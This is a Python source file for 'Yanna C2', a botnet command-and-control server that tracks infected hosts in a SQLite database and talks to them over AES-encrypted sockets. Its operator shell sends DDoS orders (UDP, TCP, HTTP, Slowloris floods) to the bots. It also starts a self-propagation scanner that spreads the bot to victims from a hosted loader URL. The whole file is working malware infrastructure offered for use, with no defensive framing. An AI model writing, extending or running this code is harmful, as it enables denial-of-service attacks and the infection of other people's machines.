# yanna_c2.py

import socket
import threading
import json
import sqlite3
import time
import base64
import os
import cmd
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# --- Configuration ---
HOST = '0.0.0.0'
PORT = 4444
# This key MUST be identical in the C2 server and the bot.
AES_KEY = b'YannaIsTheBest#1YannaIsTheBest#1' 
BLOCK_SIZE = 16
DB_FILE = 'yanna_c2.db'

# --- Global State ---
active_bots = {}  # Maps UID to socket connection
bot_lock = threading.Lock()
selected_bot_uid = None # For targeting specific bots

# --- Encryption (Mirrored from bot) ---
def decrypt(encrypted_data):
    try:
        decoded_data = base64.b64decode(encrypted_data)
        iv = decoded_data[:16]
        encrypted = decoded_data[16:]
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        decrypted_data = unpad(cipher.decrypt(encrypted), BLOCK_SIZE)
        return decrypted_data.decode('utf-8')
    except Exception:
        return None

def encrypt(data):
    try:
        iv = os.urandom(16)
        cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
        encrypted_data = cipher.encrypt(pad(data.encode('utf-8'), BLOCK_SIZE))
        return base64.b64encode(iv + encrypted_data).decode('utf-8')
    except Exception:
        return None

# --- Database Management ---
def db_init():
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS bots (
            uid TEXT PRIMARY KEY,
            ip_address TEXT,
            os_info TEXT,
            hostname TEXT,
            status TEXT,
            first_seen TEXT,
            last_seen TEXT
        )
    ''')
    conn.commit()
    # Set all bots to 'offline' on server start
    cursor.execute("UPDATE bots SET status = 'offline'")
    conn.commit()
    return conn

db_conn = db_init()

def db_update_bot(uid, ip, os_info, hostname, status="online"):
    cursor = db_conn.cursor()
    now = datetime.utcnow().isoformat().split('.')[0]
    cursor.execute("SELECT uid FROM bots WHERE uid = ?", (uid,))
    if cursor.fetchone():
        cursor.execute("UPDATE bots SET ip_address = ?, status = ?, last_seen = ? WHERE uid = ?", (ip, status, now, uid))
    else:
        cursor.execute("INSERT INTO bots (uid, ip_address, os_info, hostname, status, first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?)",
                       (uid, ip, os_info, hostname, status, now, now))
    db_conn.commit()

def db_update_bot_status(uid, status):
    cursor = db_conn.cursor()
    now = datetime.utcnow().isoformat().split('.')[0]
    cursor.execute("UPDATE bots SET status = ?, last_seen = ? WHERE uid = ?", (status, now, uid))
    db_conn.commit()

# --- C2 Core Logic ---
def broadcast_command(command_json, target_uid=None):
    """Sends a command to a specific bot or all bots."""
    encrypted_cmd = encrypt(json.dumps(command_json))
    if not encrypted_cmd:
        print("[!] Failed to encrypt command.")
        return

    with bot_lock:
        if target_uid and target_uid in active_bots:
            try:
                active_bots[target_uid].send(encrypted_cmd.encode())
                print(f"[*] Command sent to bot {target_uid}.")
                db_update_bot_status(target_uid, command_json.get('action', 'commanded'))
            except socket.error:
                print(f"[!] Bot {target_uid} appears to be disconnected.")
        elif not target_uid:
            dead_bots = []
            online_count = len(active_bots)
            for uid, conn in active_bots.items():
                try:
                    conn.send(encrypted_cmd.encode())
                    db_update_bot_status(uid, command_json.get('action', 'commanded'))
                except socket.error:
                    dead_bots.append(uid)
            
            for uid in dead_bots:
                del active_bots[uid]
                db_update_bot_status(uid, "offline")
            print(f"[*] Command broadcast to {online_count - len(dead_bots)} online bots.")

def handle_bot_connection(connection, address):
    bot_uid = None
    try:
        while True:
            # We expect a stream of data, need to buffer it
            buffer = b""
            while True:
                data = connection.recv(4096)
                if not data:
                    break
                buffer += data
                # A simple way to check for end of message, assuming one command per send
                if len(data) < 4096:
                    break
            
            if not buffer:
                break
            
            encrypted_data = buffer.decode('utf-8')
            decrypted_data = decrypt(encrypted_data)

            if not decrypted_data:
                print(f"[!] Received malformed data from {address}. Dropping.")
                continue
                
            message = json.loads(decrypted_data)
            
            if message.get("status") == "check-in":
                bot_info = message.get("data", {})
                bot_uid = bot_info.get("uid", f"unknown-{address[0]}")
                with bot_lock:
                    active_bots[bot_uid] = connection
                
                db_update_bot(bot_uid, address[0], f"{bot_info.get('os')} {bot_info.get('release')}", bot_info.get('hostname'))
                print(f"\n[+] Bot Online: {bot_uid} @ {address[0]}")
                
    except (socket.error, json.JSONDecodeError, ConnectionResetError, UnicodeDecodeError) as e:
        # print(f"DEBUG: Error in handle_bot_connection: {e}")
        pass 
    finally:
        if bot_uid:
            print(f"\n[-] Bot Offline: {bot_uid}")
            with bot_lock:
                if bot_uid in active_bots:
                    del active_bots[bot_uid]
            db_update_bot_status(bot_uid, "offline")
        connection.close()

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(100)
    print(f"[*] Yanna C2 Server listening on {HOST}:{PORT}")
    
    while True:
        connection, address = server_socket.accept()
        thread = threading.Thread(target=handle_bot_connection, args=(connection, address), daemon=True)
        thread.start()

# --- Command Interface ---
class C2Shell(cmd.Cmd):
    intro = "\n--- Welcome to the Yanna C2 Framework ---\nType 'help' to see available commands."
    prompt = "(Yanna C2 | all) "

    def do_bots(self, arg):
        """Manage bots. Usage: bots <list|select|all> [uid]"""
        global selected_bot_uid
        parts = arg.split()
        if not parts:
            print("[!] Usage: bots <list|select|all> [uid]")
            return
        
        if parts[0] == 'list':
            cursor = db_conn.cursor()
            cursor.execute("SELECT uid, ip_address, status, os_info, last_seen FROM bots ORDER BY last_seen DESC")
            bots = cursor.fetchall()
            print(f"\n{'UID':<38} {'IP Address':<15} {'Status':<12} {'OS Info':<25} {'Last Seen (UTC)':<20}")
            print("-" * 115)
            for bot in bots:
                status_color = "\033[91m" # Red for offline
                if bot[2] == "online":
                    status_color = "\033[92m" # Green
                
                print(f"{bot[0]:<38} {bot[1]:<15} {status_color}{bot[2]:<12}\033[0m {bot[3]:<25} {bot[4]:<20}")
            print(f"\nTotal Bots: {len(bots)} | Online: {len(active_bots)}")


        elif parts[0] == 'select':
            if len(parts) > 1:
                selected_bot_uid = parts[1]
                self.prompt = f"(Yanna C2 | {selected_bot_uid[:15]}...) "
                print(f"[*] Selected bot: {selected_bot_uid}")
            else:
                print("[!] Usage: bots select <uid>")
        
        elif parts[0] == 'all':
            selected_bot_uid = None
            self.prompt = "(Yanna C2 | all) "
            print("[*] Target set to all bots.")
            
    def do_attack(self, arg):
        """Launch an attack. Usage: attack <method> <ip> <port> <duration>"""
        parts = arg.split()
        if len(parts) != 4:
            print("[!] Usage: attack <method> <ip> <port> <duration>")
            print("    Methods: UDP, TCP, HTTP, SLOWLORIS")
            return
            
        method, ip, port, duration = parts
        command = {
            "action": "attack",
            "params": {
                "method": method.upper(),
                "ip": ip,
                "port": port,
                "duration": int(duration)
            }
        }
        broadcast_command(command, selected_bot_uid)

    def do_scan(self, arg):
        """
        Starts the self-propagation scanner.
        Usage: scan start <your_public_ip>
        (The public IP is where your bot script is hosted for victims to download)
        """
        parts = arg.split()
        if not parts or parts[0] != 'start' or len(parts) < 2:
            print("[!] Usage: scan start <loader_host_ip>")
            return
        
        loader_url = f"http://{parts[1]}:8000/main.py"
        print(f"[*] Ordering bots to start scanning and use loader URL: {loader_url}")
        print("[*] IMPORTANT: You must host main.py on that IP/port. Use 'python3 -m http.server 8000' in the bot directory.")

        command = {"action": "scan", "params": {"loader_url": loader_url}}
        broadcast_command(command, selected_bot_uid)

    def do_stop(self, arg):
        """Stops the current task (attack or scan) on the selected bot(s)."""
        command = {"action": "stop"}
        broadcast_command(command, selected_bot_uid)
        
    def do_exit(self, arg):
        """Exit the C2 server."""
        print("[*] Shutting down Yanna C2 server.")
        db_conn.close()
        return True

if __name__ == "__main__":
    try:
        server_thread = threading.Thread(target=start_server, daemon=True)
        server_thread.start()
        C2Shell().cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        db_conn.close()
